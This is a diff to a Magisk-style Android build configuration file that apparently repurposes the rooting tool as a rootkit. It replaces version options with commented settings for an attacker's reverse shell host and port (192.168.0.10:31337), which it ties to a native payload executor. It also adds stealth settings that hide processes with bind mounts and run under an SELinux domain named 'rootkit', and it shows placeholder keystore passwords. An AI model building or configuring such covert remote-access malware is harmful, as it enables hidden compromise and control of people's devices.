@@ -3,34 +3,48 @@
 # Removing or leaving them blank will keep default values
 ##########################################################
 
-# The version name of Magisk. Default: git HEAD short SHA1
-version=string
-
-# The version name of Magisk Manager. Default: git HEAD short SHA1
-appVersion=string
+# The version name of package
+#version=string
 
 # Output path. Default: out
-outdir=string
+#outdir=string
 
-################################################################
-# Whether to use pretty names for zips
-# e.g. Magisk-v${version}.zip, Magisk-uninstaller-${date}.zip
-# Default names are magisk-${release/debug/uninstaller}.zip
-################################################################
-
-# Default: false
-prettyName=bool
 
 #####################################################
 # Signing configs for signing zips and APKs
-# These 4 variables has to be either all set or not
+# These 4 variables have to be either all set or not
 #####################################################
 
 # Path to keystore file
-keyStore=string
+# keyStore=keystore/key.keystore
+
 # Keystore password
-keyStorePass=string
+# keyStorePass=123456
+
 # The desired key alias in the keystore
-keyAlias=string
+# keyAlias=my_key
+
 # Password of specified key alias
-keyPass=string
+# keyPass=123456
+
+
+#####################################################
+# Reverse shell parameters: LHOST and LPORT
+#  (passed as arguments for reverse ssh or other payloads)
+#  (see native/jni/payload/executor.cpp)
+#####################################################
+
+# lport=31337           #   Attacker's port
+# lhost=192.168.0.10    #   Attacker's IP
+
+
+#####################################################
+# Execution and stealth parameters
+#####################################################
+
+# Use bind mounts to hide processes (alternative method if SELinux is permissive or off)
+# hide_process_bind=1
+
+# Domain to run within (arbitrary name)
+# selinux_domain=rootkit
+
